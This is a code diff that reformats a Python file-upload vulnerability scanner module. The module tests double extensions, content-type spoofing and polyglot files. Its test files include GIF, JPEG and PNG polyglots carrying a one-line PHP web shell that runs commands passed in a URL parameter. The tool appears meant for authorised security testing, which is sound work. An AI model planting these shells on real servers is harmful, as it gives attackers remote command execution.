@@ -1,4 +1,5 @@
 """File Upload Vulnerability Scanner - inspired by HexStrike"""
+
 from rich.console import Console
 
 from suika_hub.core.http import AsyncClient
@@ -14,9 +15,20 @@ class FileUploadScanner(BaseModule):
     description = "File upload bypass testing: double extension, null byte, polyglot, content-type spoofing"
 
     MALICIOUS_EXTENSIONS = [
-        ".php", ".php3", ".php5", ".phtml", ".pht",
-        ".asp", ".aspx", ".jsp", ".jspx",
-        ".py", ".rb", ".pl", ".cgi", ".sh",
+        ".php",
+        ".php3",
+        ".php5",
+        ".phtml",
+        ".pht",
+        ".asp",
+        ".aspx",
+        ".jsp",
+        ".jspx",
+        ".py",
+        ".rb",
+        ".pl",
+        ".cgi",
+        ".sh",
     ]
 
     BYPASS_FILES = [
@@ -34,9 +46,17 @@ class FileUploadScanner(BaseModule):
         # GIF header + PHP
         {"name": "polyglot.gif", "content": b"GIF89a<?php system($_GET['cmd']); ?>", "technique": "gif_polyglot"},
         # JPEG header + PHP
-        {"name": "polyglot.jpg", "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>", "technique": "jpg_polyglot"},
+        {
+            "name": "polyglot.jpg",
+            "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
+            "technique": "jpg_polyglot",
+        },
         # PNG header + PHP
-        {"name": "polyglot.png", "content": b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "technique": "png_polyglot"},
+        {
+            "name": "polyglot.png",
+            "content": b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
+            "technique": "png_polyglot",
+        },
     ]
 
     CONTENT_TYPE_BYPASSES = [
@@ -52,15 +72,18 @@ class FileUploadScanner(BaseModule):
         """Execute file upload testing"""
         console.print("[bold cyan]File Upload Scanner[/bold cyan] - Testing upload bypass techniques")
 
-        upload_endpoints = config.get("upload_endpoints", [
-            "/api/upload",
-            "/api/file/upload",
-            "/api/avatar",
-            "/api/profile/photo",
-            "/upload",
-            "/api/attachment",
-            "/api/media",
-        ])
+        upload_endpoints = config.get(
+            "upload_endpoints",
+            [
+                "/api/upload",
+                "/api/file/upload",
+                "/api/avatar",
+                "/api/profile/photo",
+                "/upload",
+                "/api/attachment",
+                "/api/media",
+            ],
+        )
 
         # Stage 1: Find upload endpoints
         valid_endpoints = await self._find_upload_endpoints(target, client, upload_endpoints)
